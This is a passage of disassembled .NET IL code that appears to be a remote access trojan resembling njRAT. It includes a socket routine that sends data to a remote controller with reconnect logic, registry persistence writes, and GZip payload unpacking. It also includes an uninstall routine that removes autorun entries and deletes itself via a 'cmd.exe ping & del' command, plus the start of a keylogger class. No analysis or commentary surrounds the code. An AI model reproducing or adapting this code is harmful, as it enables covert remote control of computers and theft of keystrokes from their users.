      IL_01bd:  stloc.s    V_7
      IL_01bf:  ldloc.s    V_7
      IL_01c1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d0:  leave.s    IL_01d2

    }  // end handler
    IL_01d2:  nop
    .try
    {
      IL_01d3:  ldsfld     object j.OK::PLG
      IL_01d8:  brfalse.s  IL_0200

      IL_01da:  ldsfld     object j.OK::PLG
      IL_01df:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01e4:  ldnull
      IL_01e5:  ldstr      "clear"
      IL_01ea:  ldc.i4.0
      IL_01eb:  newarr     [mscorlib]System.Object
      IL_01f0:  ldnull
      IL_01f1:  ldnull
      IL_01f2:  ldnull
      IL_01f3:  ldc.i4.1
      IL_01f4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_01f9:  pop
      IL_01fa:  ldnull
      IL_01fb:  stsfld     object j.OK::PLG
      IL_0200:  leave.s    IL_021d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0202:  dup
      IL_0203:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0208:  stloc.s    V_8
      IL_020a:  ldloc.s    V_8
      IL_020c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0211:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0216:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021b:  leave.s    IL_021d

    }  // end handler
    IL_021d:  ldc.i4.0
    IL_021e:  stsfld     bool j.OK::Cn
    IL_0223:  call       bool j.OK::connect()
    IL_0228:  brfalse.s  IL_01d2

    IL_022a:  ldc.i4.1
    IL_022b:  stsfld     bool j.OK::Cn
    IL_0230:  br         IL_0000
  } // end of method OK::RC

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  ret
  } // end of method OK::SB

  .method public static bool  Send(string S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarga.s   S
    IL_0002:  call       uint8[] j.OK::SB(string&)
    IL_0007:  call       bool j.OK::Sendb(uint8[])
    IL_000c:  ret
  } // end of method OK::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       232 (0xe8)
    .maxstack  5
    .locals init (bool V_0,
             object V_1,
             class [mscorlib]System.IO.MemoryStream V_2,
             int32 V_3,
             uint8[] V_4,
             string V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7)
    IL_0000:  ldsfld     bool j.OK::Cn
    IL_0005:  brtrue.s   IL_000e

    IL_0007:  ldc.i4.0
    IL_0008:  stloc.0
    IL_0009:  br         IL_00e6

    IL_000e:  nop
    .try
    {
      IL_000f:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0014:  stloc.1
      IL_0015:  ldloc.1
      IL_0016:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_001b:  ldsfld     bool j.OK::Cn
        IL_0020:  brtrue.s   IL_0029

        IL_0022:  ldc.i4.0
        IL_0023:  stloc.0
        IL_0024:  leave      IL_00e6

        IL_0029:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_002e:  stloc.2
        IL_002f:  ldarg.0
        IL_0030:  ldlen
        IL_0031:  conv.i4
        IL_0032:  stloc.3
        IL_0033:  ldloca.s   V_3
        IL_0035:  call       instance string [mscorlib]System.Int32::ToString()
        IL_003a:  ldstr      bytearray (00 00 ) 
        IL_003f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0044:  stloc.s    V_5
        IL_0046:  ldloca.s   V_5
        IL_0048:  call       uint8[] j.OK::SB(string&)
        IL_004d:  stloc.s    V_4
        IL_004f:  ldloc.2
        IL_0050:  ldloc.s    V_4
        IL_0052:  ldc.i4.0
        IL_0053:  ldloc.s    V_4
        IL_0055:  ldlen
        IL_0056:  conv.i4
        IL_0057:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_005c:  ldloc.2
        IL_005d:  ldarg.0
        IL_005e:  ldc.i4.0
        IL_005f:  ldarg.0
        IL_0060:  ldlen
        IL_0061:  conv.i4
        IL_0062:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0067:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_006c:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0071:  ldloc.2
        IL_0072:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0077:  ldc.i4.0
        IL_0078:  ldloc.2
        IL_0079:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_007e:  conv.ovf.i4
        IL_007f:  ldc.i4.0
        IL_0080:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_0085:  pop
        IL_0086:  leave.s    IL_008f

      }  // end .try
      finally
      {
        IL_0088:  ldloc.1
        IL_0089:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_008e:  endfinally
      }  // end handler
      IL_008f:  leave.s    IL_00e0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0091:  dup
      IL_0092:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0097:  stloc.s    V_6
      IL_0099:  ldloc.s    V_6
      IL_009b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      .try
      {
        IL_00a0:  ldsfld     bool j.OK::Cn
        IL_00a5:  brfalse.s  IL_00b7

        IL_00a7:  ldc.i4.0
        IL_00a8:  stsfld     bool j.OK::Cn
        IL_00ad:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00b2:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00b7:  leave.s    IL_00d4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00b9:  dup
        IL_00ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00bf:  stloc.s    V_7
        IL_00c1:  ldloc.s    V_7
        IL_00c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00c8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00d2:  leave.s    IL_00d4

      }  // end handler
      IL_00d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00de:  leave.s    IL_00e0

    }  // end handler
    IL_00e0:  ldsfld     bool j.OK::Cn
    IL_00e5:  stloc.0
    IL_00e6:  ldloc.0
    IL_00e7:  ret
  } // end of method OK::Sendb

  .method public static bool  STV(string n,
                                  object t,
                                  valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // Code size       86 (0x56)
    .maxstack  4
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  ldarg.2
      IL_0030:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0035:  ldc.i4.1
      IL_0036:  stloc.0
      IL_0037:  leave.s    IL_0054

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0039:  dup
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003f:  stloc.1
      IL_0040:  ldloc.1
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0046:  ldc.i4.0
      IL_0047:  stloc.0
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0052:  leave.s    IL_0054

    }  // end handler
    IL_0054:  ldloc.0
    IL_0055:  ret
  } // end of method OK::STV

  .method public static void  UNS() cil managed noinlining nooptimization
  {
    // Code size       705 (0x2c1)
    .maxstack  4
    .locals init (string V_0,
             string[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11)
    IL_0000:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_000a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_000f:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0014:  stloc.0
    IL_0015:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_001a:  stloc.1
    IL_001b:  ldc.i4.0
    IL_001c:  stloc.2
    IL_001d:  br.s       IL_0057

    IL_001f:  ldloc.1
    IL_0020:  ldloc.2
    IL_0021:  ldelem.ref
    IL_0022:  stloc.0
    .try
    {
      IL_0023:  ldloc.0
      IL_0024:  ldsfld     string j.OK::RG
      IL_0029:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_002e:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0033:  brfalse.s  IL_0045

      IL_0035:  ldloc.0
      IL_0036:  ldsfld     string j.OK::RG
      IL_003b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0040:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0045:  leave.s    IL_0053

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0051:  leave.s    IL_0053

    }  // end handler
    IL_0053:  ldloc.2
    IL_0054:  ldc.i4.1
    IL_0055:  add.ovf
    IL_0056:  stloc.2
    IL_0057:  ldloc.2
    IL_0058:  ldloc.1
    IL_0059:  ldlen
    IL_005a:  conv.i4
    IL_005b:  blt.s      IL_001f

    IL_005d:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_0062:  ldstr      "sand.dat"
    IL_0067:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_006c:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0071:  brfalse.s  IL_0097

    .try
    {
      IL_0073:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0078:  ldstr      "sand.dat"
      IL_007d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0082:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0087:  leave.s    IL_0097

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0089:  dup
      IL_008a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008f:  stloc.3
      IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0095:  leave.s    IL_0097

    }  // end handler
    IL_0097:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_009c:  ldstr      "select.dat"
    IL_00a1:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00a6:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_00ab:  brfalse.s  IL_00d2

    .try
    {
      IL_00ad:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_00b2:  ldstr      "select.dat"
      IL_00b7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00bc:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_00c1:  leave.s    IL_00d2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00c3:  dup
      IL_00c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c9:  stloc.s    V_4
      IL_00cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d0:  leave.s    IL_00d2

    }  // end handler
    IL_00d2:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_00d7:  ldstr      "scream.wav"
    IL_00dc:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00e1:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_00e6:  brfalse.s  IL_010d

    .try
    {
      IL_00e8:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_00ed:  ldstr      "scream.wav"
      IL_00f2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00f7:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_00fc:  leave.s    IL_010d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00fe:  dup
      IL_00ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0104:  stloc.s    V_5
      IL_0106:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010b:  leave.s    IL_010d

    }  // end handler
    IL_010d:  ldc.i4.0
    IL_010e:  call       void j.OK::pr(int32)
    IL_0113:  ldc.i4.0
    IL_0114:  stsfld     bool j.OK::Isu
    .try
    {
      IL_0119:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_011e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0123:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0128:  ldsfld     string j.OK::sf
      IL_012d:  ldc.i4.1
      IL_012e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0133:  ldsfld     string j.OK::RG
      IL_0138:  ldc.i4.0
      IL_0139:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_013e:  leave.s    IL_015b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0140:  dup
      IL_0141:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0146:  stloc.s    V_6
      IL_0148:  ldloc.s    V_6
      IL_014a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_014f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0154:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0159:  leave.s    IL_015b

    }  // end handler
    IL_015b:  nop
    .try
    {
      IL_015c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0161:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0166:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_016b:  ldsfld     string j.OK::sf
      IL_0170:  ldc.i4.1
      IL_0171:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0176:  ldsfld     string j.OK::RG
      IL_017b:  ldc.i4.0
      IL_017c:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0181:  leave.s    IL_019e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0183:  dup
      IL_0184:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0189:  stloc.s    V_7
      IL_018b:  ldloc.s    V_7
      IL_018d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0192:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0197:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_019c:  leave.s    IL_019e

    }  // end handler
    IL_019e:  nop
    .try
    {
      IL_019f:  ldsfld     bool j.OK::HIDE_ME
      IL_01a4:  brfalse.s  IL_01c9

      IL_01a6:  ldsfld     string j.OK::DR
      IL_01ab:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_01b0:  ldstr      "\\"
      IL_01b5:  ldsfld     string j.OK::EXE
      IL_01ba:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01bf:  ldc.i4     0x80
      IL_01c4:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_01c9:  ldc.i4.7
      IL_01ca:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_01cf:  ldstr      "\\"
      IL_01d4:  ldsfld     string j.OK::RG
      IL_01d9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01de:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
      IL_01e3:  stloc.s    V_8
      IL_01e5:  ldc.i4.7
      IL_01e6:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_01eb:  ldstr      "\\"
      IL_01f0:  ldloc.s    V_8
      IL_01f2:  ldstr      ".url"
      IL_01f7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_01fc:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0201:  ldc.i4.7
      IL_0202:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0207:  ldstr      "\\"
      IL_020c:  ldsfld     string j.OK::RG
      IL_0211:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0216:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_021b:  leave.s    IL_0238

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_021d:  dup
      IL_021e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0223:  stloc.s    V_9
      IL_0225:  ldloc.s    V_9
      IL_0227:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_022c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0231:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0236:  leave.s    IL_0238

    }  // end handler
    IL_0238:  nop
    .try
    {
      IL_0239:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_023e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0243:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0248:  ldstr      "Software"
      IL_024d:  ldc.i4.1
      IL_024e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0253:  ldsfld     string j.OK::RG
      IL_0258:  ldc.i4.0
      IL_0259:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_025e:  leave.s    IL_027b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0260:  dup
      IL_0261:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0266:  stloc.s    V_10
      IL_0268:  ldloc.s    V_10
      IL_026a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_026f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0274:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0279:  leave.s    IL_027b

    }  // end handler
    IL_027b:  nop
    .try
    {
      IL_027c:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_0281:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0286:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_028b:  ldstr      "\""
      IL_0290:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0295:  ldc.i4.0
      IL_0296:  ldc.i4.0
      IL_0297:  ldc.i4.m1
      IL_0298:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_029d:  pop
      IL_029e:  leave.s    IL_02bb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a0:  dup
      IL_02a1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02a6:  stloc.s    V_11
      IL_02a8:  ldloc.s    V_11
      IL_02aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02b4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02b9:  leave.s    IL_02bb

    }  // end handler
    IL_02bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02c0:  ret
  } // end of method OK::UNS

  .method public static uint8[]  ZIP(uint8[] B) cil managed
  {
    // Code size       105 (0x69)
    .maxstack  4
    .locals init (class [mscorlib]System.IO.MemoryStream V_0,
             class [System]System.IO.Compression.GZipStream V_1,
             uint8[] V_2,
             int32 V_3,
             uint8[] V_4)
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  ldc.i4.0
    IL_0009:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_000e:  stloc.1
    IL_000f:  ldc.i4.4
    IL_0010:  newarr     [mscorlib]System.Byte
    IL_0015:  stloc.2
    IL_0016:  ldloc.0
    IL_0017:  ldloc.0
    IL_0018:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_001d:  ldc.i4.5
    IL_001e:  conv.i8
    IL_001f:  sub.ovf
    IL_0020:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0025:  ldloc.0
    IL_0026:  ldloc.2
    IL_0027:  ldc.i4.0
    IL_0028:  ldc.i4.4
    IL_0029:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_002e:  pop
    IL_002f:  ldloc.2
    IL_0030:  ldc.i4.0
    IL_0031:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0036:  stloc.3
    IL_0037:  ldloc.0
    IL_0038:  ldc.i4.0
    IL_0039:  conv.i8
    IL_003a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_003f:  ldloc.3
    IL_0040:  ldc.i4.1
    IL_0041:  sub.ovf
    IL_0042:  ldc.i4.1
    IL_0043:  add.ovf
    IL_0044:  ldc.i4.1
    IL_0045:  sub.ovf
    IL_0046:  ldc.i4.1
    IL_0047:  add.ovf
    IL_0048:  newarr     [mscorlib]System.Byte
    IL_004d:  stloc.s    V_4
    IL_004f:  ldloc.1
    IL_0050:  ldloc.s    V_4
    IL_0052:  ldc.i4.0
    IL_0053:  ldloc.3
    IL_0054:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0059:  pop
    IL_005a:  ldloc.1
    IL_005b:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0060:  ldloc.0
    IL_0061:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0066:  ldloc.s    V_4
    IL_0068:  ret
  } // end of method OK::ZIP

} // end of class j.OK

.class public auto ansi j.kl
       extends [mscorlib]System.Object
{
  .field private string LastAS
  .field private int32 LastAV
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public string Logs
  .field public string vn
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       36 (0x24)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4.0
    IL_0008:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
